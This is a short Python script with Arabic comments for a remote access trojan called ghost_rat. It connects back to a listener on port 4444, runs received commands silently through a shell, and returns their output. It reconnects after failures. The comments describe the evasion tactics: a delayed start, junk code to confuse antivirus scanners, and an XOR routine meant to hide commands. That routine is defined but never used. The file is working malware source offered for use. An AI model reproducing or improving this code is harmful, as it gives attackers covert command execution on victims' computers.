import time

time.sleep(30)  # الكود هيستنى 30 ثانية قبل ما يعمل أي حاجة

import socket, subprocess, os, time


# دالة لتشفير بسيط (XOR) عشان نخبّي الأوامر من الـ Scan
def xor_cipher(data):
    key = 123  # مفتاح التشفير
    return bytearray([b ^ key for b in data])


def ghost_rat():
    # هنا بنضيف كود كتير ملوش لازمة (Junk Code) عشان نكبر حجم الملف ونشتت الـ AV
    for i in range(100):
        _ = (i * 5) / 2

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # الاتصال باللابتوب
        s.connect(("127.0.0.1", 4444))

        while True:
            # استقبال الأوامر وتنفذها في صمت
            data = s.recv(1024)
            if not data:
                break

            # تنفيذ الأمر وإرسال النتيجة
            proc = subprocess.Popen(
                data.decode(),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            stdout_value = proc.stdout.read() + proc.stderr.read()
            s.send(stdout_value)
    except:
        time.sleep(10)  # لو حصل قفل، يستنى شوية ويحاول تاني (Persistence)
        ghost_rat()


if __name__ == "__main__":
    ghost_rat()
